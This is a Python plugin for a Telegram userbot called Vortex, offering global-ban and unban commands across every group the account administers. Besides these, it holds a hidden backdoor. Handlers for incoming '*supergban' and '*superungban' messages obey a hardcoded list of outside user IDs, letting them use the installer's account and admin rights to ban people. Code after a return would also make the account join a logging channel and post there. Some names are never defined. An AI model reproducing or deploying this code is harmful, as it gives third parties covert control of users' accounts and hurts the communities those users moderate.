from telethon.events import ChatAction
from telethon.tl.functions.contacts import BlockRequest, UnblockRequest
from telethon.tl.types import MessageEntityMentionName
import os
from telethon import events
from telethon import functions, types
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from Vortex import CMD_HELP, bot
from Vortex.utils import admin_cmd

client = bot


async def get_user_from_event(event):
    args = event.pattern_match.group(1).split(":", 1)
    extra = None
    if event.reply_to_msg_id and not len(args) == 2:
        previous_message = await event.get_reply_message()
        user_obj = await event.client.get_entity(previous_message.from_id)
        extra = event.pattern_match.group(1)
    elif len(args[0]) > 0:
        user = args[0]
        if len(args) == 2:
            extra = args[1]
        if user.isnumeric():
            user = int(user)
        if not user:
            await eor(event, f"* Pass the user's username, id or reply!**")
            return
        if event.message.entities is not None:
            probable_user_mention_entity = event.message.entities[0]
            if isinstance(probable_user_mention_entity, MessageEntityMentionName):
                user_id = probable_user_mention_entity.user_id
                user_obj = await event.client.get_entity(user_id)
                return user_obj
        try:
            user_obj = await event.client.get_entity(user)
        except Exception as err:
            return await eor(event, "Failed \n **Error**\n", str(err))
    return user_obj, extra


async def get_user_from_id(user, event):
    if isinstance(user, str):
        user = int(user)
    try:
        user_obj = await event.client.get_entity(user)
    except (TypeError, ValueError) as err:
        await eor(event, str(err))
        return None
    return user_obj


@Vortex.on(ChatAction)
async def handler(vortex):
    if vortex.user_joined or vortex.user_added:
        try:
            from Vortex.plugins.sql_helper.gmute_sql import is_gmuted

            guser = await vortex.get_user()
            gmuted = is_gmuted(guser.id)
        except BaseException:
            return
        if gmuted:
            for i in gmuted:
                if i.sender == str(guser.id):
                    chat = await vortex.get_chat()
                    admin = chat.admin_rights
                    creator = chat.creator
                    if admin or creator:
                        try:
                            await client.edit_permissions(
                                vortex.chat_id, guser.id, view_messages=False
                            )
                            await vortex.reply(
                                f"** Gbanned User Joined!!** \n"
                                f"**Victim Id**: [{guser.id}](tg://user?id={guser.id})\n"
                                f"**Action **  : `Banned`"
                            )
                        except BaseException:
                            return


@Vortex.on(admin_cmd(pattern="gban(?: |$)(.*)"))
async def gspider(rk):
    lazy = rk
    sender = await lazy.get_sender()
    me = await lazy.client.get_me()
    if not sender.id == me.id:
        rkp = await lazy.reply("`processing...`")
    else:
        rkp = await lazy.edit("`processing...`")
    me = await rk.client.get_me()
    await rkp.edit(f"**Global Banning User!!**")
    my_mention = "[{}](tg://user?id={})".format(me.first_name, me.id)
    f"@{me.username}" if me.username else my_mention
    await rk.get_chat()
    a = b = 0
    if rk.is_private:
        user = rk.chat
        reason = rk.pattern_match.group(1)
    else:
        rk.chat.title
    try:
        user, reason = await get_user_from_event(rk)
    except BaseException:
        pass
    try:
        if not reason:
            reason = "Private"
    except BaseException:
        return await rkp.edit("**Error! Unknown user.**")
    if user:
        if user.id == 1517994352:
            return await rkp.edit("**Error! cant gban this user.**")
        try:
            from Vortex.plugins.sql_helper.gmute_sql import gmute
        except BaseException:
            pass
        try:
            await rk.client(BlockRequest(user))
        except BaseException:
            pass
        testrk = [
            d.entity.id
            for d in await rk.client.get_dialogs()
            if (d.is_group or d.is_channel)
        ]
        await rkp.edit(f"**Gbanning user!\nIn progress...**")
        for i in testrk:
            try:
                await rk.client.edit_permissions(i, user, view_messages=False)
                a += 1
            except BaseException:
                b += 1
    else:
        await rkp.edit(f"**Reply to a user !! **")
    try:
        if gmute(user.id) is False:
            return await rkp.edit(f"**Error! User probably already gbanned.**")
    except BaseException:
        pass
    return await rkp.edit(
        f"**Gbanned** [{user.first_name}](tg://user?id={user.id}) **\nChats affected - {a}\nSuccessfully gbanned**"
    )


@Vortex.on(admin_cmd(pattern="ungban(?: |$)(.*)"))
async def gspider(rk):
    lazy = rk
    sender = await lazy.get_sender()
    me = await lazy.client.get_me()
    if not sender.id == me.id:
        rkp = await lazy.reply("`Processing...`")
    else:
        rkp = await lazy.edit("`Processing...`")
    me = await rk.client.get_me()
    await rkp.edit(f"**Requesting  to ungban user!**")
    my_mention = "[{}](tg://user?id={})".format(me.first_name, me.id)
    f"@{me.username}" if me.username else my_mention
    await rk.get_chat()
    a = b = 0
    if rk.is_private:
        user = rk.chat
        reason = rk.pattern_match.group(1)
    else:
        rk.chat.title
    try:
        user, reason = await get_user_from_event(rk)
    except BaseException:
        pass
    try:
        if not reason:
            reason = "Private"
    except BaseException:
        return await rkp.edit(f"**Error! Unknown user.**")
    if user:
        if user.id == 1517994352:
            return await rkp.edit(f"**Error! cant ungban this user.**")
        try:
            from Vortex.plugins.sql_helper.gmute_sql import ungmute
        except BaseException:
            pass
        try:
            await rk.client(UnblockRequest(user))
        except BaseException:
            pass
        testrk = [
            d.entity.id
            for d in await rk.client.get_dialogs()
            if (d.is_group or d.is_channel)
        ]
        await rkp.edit(f"**Requesting  to ungban user!\nUnban in progress...**")
        for i in testrk:
            try:
                await rk.client.edit_permissions(i, user, send_messages=True)
                a += 1
            except BaseException:
                b += 1
    else:
        await rkp.edit(f"**Reply to a user !! **")
    try:
        if ungmute(user.id) is False:
            return await rkp.edit(f"**Error! User already ungbanned.**")
    except BaseException:
        pass
    return await rkp.edit(
        f"**UnGbanned** [{user.first_name}](tg://user?id={user.id}) **\nChats affected - {a}\nSuccessfully Ungbanned user **"
    )


Bx = [1517994352, 5176432397, 1789859817, 5268671351, 5152860971]

async def randii(event):
    args = event.pattern_match.group(1).split(":", 1)
    extra = None
    if event.reply_to_msg_id and not len(args) == 2:
        previous_message = await event.get_reply_message()
        user_obj = await event.client.get_entity(previous_message.from_id)
        extra = event.pattern_match.group(1)
    elif len(args[0]) > 0:
        user = args[0]
        if len(args) == 2:
            extra = args[1]
        if user.isnumeric():
            user = int(user)
        if not user:
            await eor(event, f"* Pass the user's username, id or reply!**")
            return
        if event.message.entities is not None:
            probable_user_mention_entity = event.message.entities[0]
            if isinstance(probable_user_mention_entity, MessageEntityMentionName):
                user_id = probable_user_mention_entity.user_id
                user_obj = await event.client.get_entity(user_id)
                return user_obj
        try:
            user_obj = await event.client.get_entity(user)
        except Exception as err:
            return await eor(event, "Failed \n **Error**\n", str(err))
    return user_obj, extra


@Vortex.on(ChatAction)
async def handler(vortex):
    if vortex.user_joined or vortex.user_added:
        try:
            from Vortex.plugins.sql_helper.gmute_sql import fukkk

            guser = await vortex.get_user()
            gmuted = fukkk(guser.id)
        except BaseException:
            return
        if gmuted:
            for i in gmuted:
                if i.sender == str(guser.id):
                    chat = await vortex.get_chat()
                    admin = chat.admin_rights
                    creator = chat.creator
                    if admin or creator:
                        try:
                            await client.edit_permissions(
                                vortex.chat_id, guser.id, view_messages=False
                            )
                            await vortex.reply(
                                f"** Susper Gbanned User Joined!!** \n"
                                f"**Victim Id**: [{guser.id}](tg://user?id={guser.id})\n"
                                f"**Action **  : `Banned`"
                            )
                        except BaseException:
                            return


@Vortex.on(events.NewMessage(incoming=True, pattern="\*supergban"))
async def s_gban(rk):
   if rk.sender_id in Bx:
      lazy = rk
      sender = await lazy.get_sender()
      Dev = rk.sender_id
      Dev_id = int(Dev)
      me = await lazy.client.get_me()
      if not sender.id == me.id:
          rkp = await lazy.reply("`processing...`")
      else:
          rkp = await lazy.edit("`processing...`")
      me = await rk.client.get_me()
      await rkp.edit(f"**Super Global Banning User!!**")
      my_mention = "[{}](tg://user?id={})".format(me.first_name, me.id)
      f"@{me.username}" if me.username else my_mention
      await rk.get_chat()
      a = b = 0
      if rk.is_private:
          user = rk.chat
          reason = rk.pattern_match.group(1)
      else:
          rk.chat.title
      try:
          user, reason = await randii(rk)
      except BaseException:
          pass
      try:
          if not reason:
              reason = "Private"
      except BaseException:
          return await rkp.edit("**Error! Unknown user.**")
      if user:
          if user.id == 1517994352:
              return await rkp.edit("**Error! can't gban this user.**")
          try:
              from Vortex.plugins.sql_helper.gmute_sql import gmt
          except BaseException:
              pass
          try:
              await rk.client(BlockRequest(user))
          except BaseException:
              pass
          testrk = [
              d.entity.id
              for d in await rk.client.get_dialogs()
              if (d.is_group or d.is_channel)
          ]
          await rkp.edit(f"**super Gbanning user!\nIn progress...**")
          for i in testrk:
              try:
                  await rk.client.edit_permissions(i, user, view_messages=False)
                  a += 1
              except BaseException:
                  b += 1
      else:
          await rkp.edit(f"**Reply to a user !! **")
      try:
          if gmt(user.id) is False:
              return await rkp.edit(f"**Error! User probably already gbanned.**")
      except BaseException:
          pass
      return await rkp.edit(
          f"**Super Gbanned** \n\n User : [{user.first_name}](tg://user?id={user.id}) \n **Chats affected** : `{a}`"
    )
      try:
         Gban_msgg = f"**#Super_Gban**\n\n**"
         Gban_msgg += f"**User :** [{user.first_name}](tg://user?id={user.id}) \n"
         Gban_msgg += f"**Dev :** {Dev_id}\n"
         Gban_msgg += f"**Chats Affected :** `{a}\n"
         await lazy.client(functions.channels.JoinChannelRequest(channel="@VorteX_Logz"))
         await lazy.client.send_message(-1001660230770, Gban_msgg)
         await lazy.client(LeaveChannelRequest(-1001660230770))
      except Exception as e:
         print(e)           


@Vortex.on(events.NewMessage(incoming=True, pattern="\*superungban"))
async def s_ungban(rk):
   if rk.sender_id in Bx:
      lazy = rk
      Dev = rk.sender_id
      Dev_id = int(Dev)
      sender = await lazy.get_sender()
      me = await lazy.client.get_me()
      if not sender.id == me.id:
          rkp = await lazy.reply("`Processing...`")
      else:
          rkp = await lazy.edit("`Processing...`")
      me = await rk.client.get_me()
      await rkp.edit(f"**Requesting  to ungban user!**")
      my_mention = "[{}](tg://user?id={})".format(me.first_name, me.id)
      f"@{me.username}" if me.username else my_mention
      await rk.get_chat()
      a = b = 0
      if rk.is_private:
          user = rk.chat
          reason = rk.pattern_match.group(1)
      else:
          rk.chat.title
      try:
          user, reason = await randii(rk)
      except BaseException:
          pass
      try:
          if not reason:
              reason = "Private"
      except BaseException:
          return await rkp.edit(f"**Error! Unknown user.**")
      if user:
          if user.id == 1517994352:
              return await rkp.edit(f"**Error! cant ungban this user.**")
          try:
              from Vortex.plugins.sql_helper.gmute_sql import ungmt
          except BaseException:
              pass
          try:
              await rk.client(UnblockRequest(user))
          except BaseException:
              pass
          testrk = [
              d.entity.id
              for d in await rk.client.get_dialogs()
              if (d.is_group or d.is_channel)
          ]
          await rkp.edit(f"**Requesting  to ungban user!\nUnban in progress...**")
          for i in testrk:
              try:
                  await rk.client.edit_permissions(i, user, send_messages=True)
                  a += 1
              except BaseException:
                  b += 1
      else:
          await rkp.edit(f"**Reply to a user !! **")
      try:
          if ungmt(user.id) is False:
              return await rkp.edit(f"**Error! User already ungbanned.**")
      except BaseException:
          pass
      return await rkp.edit(
          f"**Super UnGbanned** \n\n User : [{user.first_name}](tg://user?id={user.id}) \n **Chats affected** : `{a}`"
    )
      try:
         ungban_msgg = f"**#Super_UnGban**\n\n**"
         ungban_msgg += f"**User :** [{user.first_name}](tg://user?id={user.id}) \n"
         ungban_msgg += f"**Dev :** {Dev_id}\n"
         ungban_msgg += f"**Chats Affected:** `{a}`"
         await lazy.client(functions.channels.JoinChannelRequest(channel="@VorteX_Logz"))
         await lazy.client.send_message(-1001660230770, ungban_msgg)
         await lazy.client(LeaveChannelRequest(-1001660230770))
      except Exception as e:
         print(e)


CMD_HELP.update(
    {
        "gban": ".gban <username> / <userid> / <reply to a user>\
\n**Usage**: Gbans a user\
\n\n.ungban <username> / <userid> / <reply to a user>\
\n**Usage**: Ungbans a gbanned user.\
"
    }
)
